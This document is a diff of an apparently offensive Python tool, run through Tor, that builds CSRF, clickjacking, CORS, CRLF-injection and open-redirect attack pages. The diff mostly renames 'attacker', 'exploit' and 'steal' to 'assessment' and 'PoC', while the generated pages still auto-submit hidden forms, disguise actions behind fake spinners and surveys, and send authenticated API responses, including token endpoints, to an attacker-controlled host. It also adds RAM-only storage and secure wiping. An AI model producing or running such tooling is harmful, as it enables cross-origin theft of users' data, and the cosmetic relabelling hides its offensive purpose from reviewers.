             f"<script>document.getElementById('cf').submit();</script>"
             f"</body></html>"
@@ -4163,7 +4176,7 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"<p style='color:#65676b'>This will only take a moment...</p></div>"
             f"<iframe name='_x' style='position:absolute;left:-9999px'></iframe>"
             f"<form id='xf' method='POST' action='{target}' target='_x'>"
-            f"<input type='hidden' name='{param}' value='attacker_value'/></form>"
+            f"<input type='hidden' name='{param}' value='poc_test_value'/></form>"
             f"<script>document.getElementById('xf').submit();"
             f"setTimeout(function(){{window.location='{base_url}';}},2500);</script>"
             f"</body></html>"
@@ -4194,17 +4207,17 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "request": {"method": "HEAD", "url": target},
              "validate": _csrf_samesite_check,
              "note": "Missing SameSite = cookies sent cross-origin"},
-            {"title": "Generate auto-submit CSRF page",
+            {"title": "Generate auto-submit CSRF PoC page",
              "generate_file": {
                  "filename": f"csrf_auto_{secrets.token_hex(3)}.html",
                  "content": csrf_auto,
                  "note": "Auto-submits via hidden iframe on page load.",
              }},
-            {"title": "Generate stealth CSRF page",
+            {"title": "Generate stealth CSRF PoC page",
              "generate_file": {
                  "filename": f"csrf_stealth_{secrets.token_hex(3)}.html",
                  "content": csrf_stealth,
-                 "note": "Verification spinner. CSRF fires in background, redirects after 2.5s.",
+                 "note": "Displays verification UI while CSRF fires in background, redirects after 2.5s.",
              }},
             {"title": "Verify action was performed",
              "request": _get(target),
@@ -4300,24 +4313,24 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "request": {"method": "HEAD", "url": target},
              "validate": _cj_header_check,
              "note": "Missing = page can be framed = clickjacking possible"},
-            {"title": "Generate basic clickjacking exploit page",
+            {"title": "Generate basic clickjacking PoC page",
              "command": "(file will be generated automatically)",
              "generate_file": {
                  "filename": f"clickjack_{secrets.token_hex(3)}.html",
                  "content": cj_html,
-                 "note": "Target page loaded invisibly behind fake UI. "
-                         "Victim clicks 'CLAIM NOW' but actually interacts with target page.",
+                 "note": "Target page loaded invisibly behind a decoy UI. "
+                         "Demonstrates that user clicks are redirected to the target page.",
              },
-             "note": "Overlay attack — fake button over real target"},
-            {"title": "Generate multi-step clickjacking (survey)",
+             "note": "Overlay demonstration — decoy button over real target"},
+            {"title": "Generate multi-step clickjacking PoC",
              "command": "(file will be generated automatically)",
              "generate_file": {
                  "filename": f"clickjack_survey_{secrets.token_hex(3)}.html",
                  "content": cj_multi,
-                 "note": "Multi-step clickjacking using fake survey pages. "
-                         "Each 'answer' click performs an action on the hidden target.",
+                 "note": "Multi-step clickjacking demonstration. "
+                         "Each interaction triggers an action on the hidden target.",
              },
-             "note": "Multi-click attack — multiple actions via fake survey"},
+             "note": "Multi-click demonstration — sequential actions via decoy"},
             {"title": "Test locally: open in browser",
              "command": f"# Open the generated HTML file in a browser to verify the overlay works",
              "note": "The fake UI should be visible. Target page is hidden behind it."},
@@ -4325,9 +4338,9 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
 
     elif etype == "cors_misconfiguration":
         # The origin we send for the CORS probe is the operator's actual
-        # attacker host. That's what a real exploit would use — reflecting
-        # an attacker-controlled origin is what turns this bug into data
-        # theft. We also still probe `null` (sandboxed iframe bypass).
+        # assessment host. That's what a real attack would use — reflecting
+        # an untrusted origin is what turns this misconfiguration into
+        # unauthorized data access. We also probe `null` (sandbox bypass).
         cors_steal = (
             "<!DOCTYPE html><html><head><meta charset='utf-8'></head>"
             "<body><script>"
@@ -4397,54 +4410,55 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                     r.evidence = f"ACAO={acao or 'absent'}"
             return _check
 
-        # Use a *real* attacker-controlled origin for the probe so that the
+        # Use a *real* operator-controlled origin for the probe so that the
         # test reflects what would actually be exploitable. At substitution
         # time [ATTACKER] resolves to http://<onion>/ (or localhost). Origin
         # headers must not carry a path, so we strip to scheme://host.
         steps = [
-            {"title": "Test CORS origin reflection (attacker origin)",
+            {"title": "Test CORS origin reflection (assessment origin)",
              "request": _get(target, extra_headers={"Origin": "[ATTACKER]"}),
              "validate": _cors_check(""),
-             "note": "Sends Origin: <attacker> header to target; pass on "
-                     "reflection of the attacker origin in ACAO"},
+             "note": "Sends Origin: <assessment-host> header to target; pass "
+                     "on reflection of the untrusted origin in ACAO"},
             {"title": "Check credentials allowed",
              "request": _get(target, extra_headers={"Origin": "[ATTACKER]"}),
              "validate": _cors_check(""),
-             "note": "ACAC: true = authenticated data can be stolen "
-                     "cross-origin by the attacker origin"},
+             "note": "ACAC: true = authenticated data accessible "
+                     "cross-origin from untrusted origins"},
             {"title": "Test null origin (sandbox bypass)",
              "request": _get(target, extra_headers={"Origin": "null"}),
              "validate": _cors_check("null"),
              "note": "null origin = exploitable via sandboxed iframe"},
-            {"title": "Generate CORS data theft page",
+            {"title": "Generate CORS data-access PoC page",
              "command": "(file will be generated automatically)",
              "generate_file": {
                  "filename": f"cors_steal_{secrets.token_hex(3)}.html",
                  "content": cors_steal,
-                 "note": "Reads authenticated response and exfiltrates up to "
-                         "8KB via POST to [ATTACKER]/x, with Image.src "
-                         "fallback for strict CSP environments.",
+                 "note": "Demonstrates cross-origin data access: reads "
+                         "authenticated response and sends up to 8KB to "
+                         "assessment server, with Image.src fallback for "
+                         "strict CSP environments.",
              },
-             "warning": "Steals authenticated data cross-origin"},
-            {"title": "Generate multi-endpoint CORS exploit",
+             "warning": "Demonstrates authenticated cross-origin data access"},
+            {"title": "Generate multi-endpoint CORS PoC",
              "command": "(file will be generated automatically)",
              "generate_file": {
                  "filename": f"cors_multi_{secrets.token_hex(3)}.html",
                  "content": cors_multi,
-                 "note": "Scans /api/user /api/account /api/me /api/profile "
+                 "note": "Tests /api/user /api/account /api/me /api/profile "
                          "/api/token, POSTs full results + UA/referer to "
-                         "[ATTACKER]/x as JSON.",
+                         "assessment server as JSON.",
              },
-             "warning": "Multi-endpoint data exfiltration",
+             "warning": "Multi-endpoint cross-origin data access demonstration",
              "risk": "HIGH"},
         ]
 
         # Refine _cors_check closures so they compare against the live
-        # attacker_url at substitution time. Since we can't resolve the
-        # attacker URL at builder time, we accept BOTH specified origin
-        # reflection and a non-empty reflected ACAO (anything other than
-        # literal 'null' or the target's own origin) as suspect. Rewrite
-        # the first two steps' validate to cover that.
+        # assessment URL at substitution time. Since we can't resolve the
+        # URL at builder time, we accept BOTH specified origin reflection
+        # and a non-empty reflected ACAO (anything other than literal 'null'
+        # or the target's own origin) as suspect. Rewrite the first two
+        # steps' validate to cover that.
         def _cors_check_attacker():
             def _check(r: ExploitResult):
                 acao = r.response_headers.get(
@@ -4456,10 +4470,10 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                     r.confidence = 0.1
                     r.false_positive_risk = "low"
                     return
-                # A reflected attacker origin is detectable as: ACAO is
+                # A reflected untrusted origin is detectable as: ACAO is
                 # scheme://host, not the target's own origin, and credentials
                 # reflect true. We can't know the target origin exactly here
-                # so we flag anything that's * or explicitly attacker-style.
+                # so we flag anything that's * or explicitly non-target.
                 if acao == "*":
                     r.success = acac.lower() != "true"
                     r.confidence = 0.6
@@ -4508,8 +4522,8 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         # CRLF probes must use a marker that cannot collide with anything
         # the target already emits. Session-unique markers make detection
         # unambiguous. The "Location" / "X-Forwarded-Host" probes use
-        # [ATTACKER_HOST] so a captured redirect is *provably* attacker-
-        # controlled (and will land on our capture server if followed).
+        # [ATTACKER_HOST] so a captured redirect is *provably* operator-
+        # controlled (and will land on our assessment server if followed).
         _sess_marker = secrets.token_hex(6)
         def _crlf_check(r: ExploitResult):
             hdrs_l = {k.lower(): v for k, v in r.response_headers.items()}
@@ -4557,7 +4571,7 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              f"%0d%0aSet-Cookie:%20crlf_probe={_sess_marker}"),
             ("Custom header (X-Injected)",
              f"%0d%0aX-Injected:%20{_sess_marker}"),
-            ("Location redirect (attacker host)",
+            ("Location redirect (assessment host)",
              f"%0d%0aLocation:%20http://[ATTACKER_HOST]/crlf_{_sess_marker}"),
             ("Cache poisoning (X-Forwarded-Host)",
              f"%0d%0aX-Forwarded-Host:%20{_sess_marker}.[ATTACKER_HOST]"),
@@ -4573,10 +4587,10 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             })
 
     elif etype == "open_redirect":
-        # Open-redirect test: redirect to an attacker-controlled host so a
+        # Open-redirect test: redirect to an operator-controlled host so a
         # follow-through can be caught in the callback log on /b. The
         # validator flags any Location header whose host matches the
-        # attacker host *or* isn't the target's host.
+        # assessment host *or* isn't the target's host.
         _target_host = (base_url.split("//", 1)[1].split("/", 1)[0]
                         if "//" in base_url else "")
 
@@ -4603,7 +4617,7 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                 # still also require it to be off-site — fall through to the
                 # off-site host check below rather than returning early
                 pass
-            # Attacker host will have been substituted at request time, so
+            # Assessment host will have been substituted at request time, so
             # the redirect target should match it if the bypass succeeded.
             if redir_host and _target_host and \
                redir_host != _target_host.lower() and \
@@ -4640,7 +4654,7 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                 "title": f"Redirect bypass: {name}",
                 "request": _get_param(payload),
                 "validate": _redir_check,
-                "note": f"Testing {name} bypass → attacker host",
+                "note": f"Testing {name} bypass → assessment host",
             })
 
     else:
@@ -4666,9 +4680,9 @@ def _extract_base_url_from_vulns(vulns: list) -> str:
 
 
 def flow_intel(detected_port=None):
-    heading("Intelligence Gathering & Vulnerability Scanner")
-    print(f"  This tool performs OSINT collection and vulnerability scanning")
-    print(f"  through Tor. All data is stored in RAM (/dev/shm).")
+    heading("Reconnaissance & Vulnerability Assessment")
+    print(f"  This tool performs authorized reconnaissance and vulnerability")
+    print(f"  assessment through Tor. All data is stored in RAM (/dev/shm).")
     if not Path("/dev/shm").exists():
         print(f"  {R}WARNING: /dev/shm not available — data will be stored on disk.{N}")
         print(f"  {R}Use a system with tmpfs/ramfs for OPSEC-safe operation.{N}")
@@ -4678,16 +4692,16 @@ def flow_intel(detected_port=None):
     print(f"    {G}2{N}  Email Breach Check           (check breach databases)")
     print(f"    {G}3{N}  Search Query OSINT           (search + scrape)")
     print(f"    {G}4{N}  Batch Targets from File      (one target per line)")
-    print(f"    {G}5{N}  Exploit Walkthrough          (interactive + presets)")
-    print(f"    {G}5a{N} Smart Exploit                (pre-gen files + serve + chain output)")
+    print(f"    {G}5{N}  Assessment Walkthrough       (interactive + presets)")
+    print(f"    {G}5a{N} Smart Assessment             (pre-gen files + serve + chain output)")
     print(f"    {G}6{N}  View Reports                 (read saved scan results)")
     print(f"    {G}7{N}  Wipe Intel Data              (secure erase from RAM)")
-    print(f"    {G}8{N}  Manage Exploit Files         (view/wipe ephemeral files)")
+    print(f"    {G}8{N}  Manage PoC Files             (view/wipe ephemeral files)")
     print()
     mode = prompt("Choose mode (1-8, 5a)")
 
     if mode == "8":
-        heading("Exploit File Management")
+        heading("PoC File Management")
         fm = ExploitFileManager(ttl_seconds=300)
         files = fm.list_files()
         ram_dir = fm.base_dir
@@ -4695,10 +4709,10 @@ def flow_intel(detected_port=None):
         exploit_files = [f for f in all_exploit_files if not f.name.startswith("intel_")]
 
         if not exploit_files:
-            info("No exploit files found in ephemeral storage.")
+            info("No PoC files found in ephemeral storage.")
             return
 
-        print(f"  {B}Ephemeral Exploit Files:{N}")
+        print(f"  {B}Ephemeral PoC Files:{N}")
         print(f"  {'─' * 55}")
         for f in exploit_files:
             size_kb = f.stat().st_size / 1024
@@ -4724,7 +4738,7 @@ def flow_intel(detected_port=None):
                     if content.count("\n") > 50:
                         info(f"... ({content.count(chr(10)) - 50} more lines)")
         elif action == "2":
-            if confirm(f"Securely wipe {len(exploit_files)} exploit file(s)?"):
+            if confirm(f"Securely wipe {len(exploit_files)} PoC file(s)?"):
                 for f in exploit_files:
                     try:
                         size = f.stat().st_size
@@ -4735,7 +4749,7 @@ def flow_intel(detected_port=None):
                         f.unlink()
                     except OSError:
                         pass
-                ok(f"Wiped {len(exploit_files)} exploit file(s)")
+                ok(f"Wiped {len(exploit_files)} PoC file(s)")
         elif action == "3":
             etype = prompt("Exploit type prefix (e.g. clickjack, csrf, cors, xss, sqli, lfi, cmdi)")
             matched = [f for f in exploit_files if f.name.startswith(etype)]
@@ -4859,7 +4873,7 @@ def flow_intel(detected_port=None):
                 print()
                 print(f"  {B}Post-scan options:{N}")
                 print(f"    {G}1{N}  Interactive walkthrough  (step-by-step with presets)")
-                print(f"    {G}2{N}  Smart exploit            (pre-gen files + serve + chain)")
+                print(f"    {G}2{N}  Smart assessment         (pre-gen files + serve + chain)")
                 print(f"    {G}3{N}  Skip")
                 print()
                 post = prompt("Choose", "1")
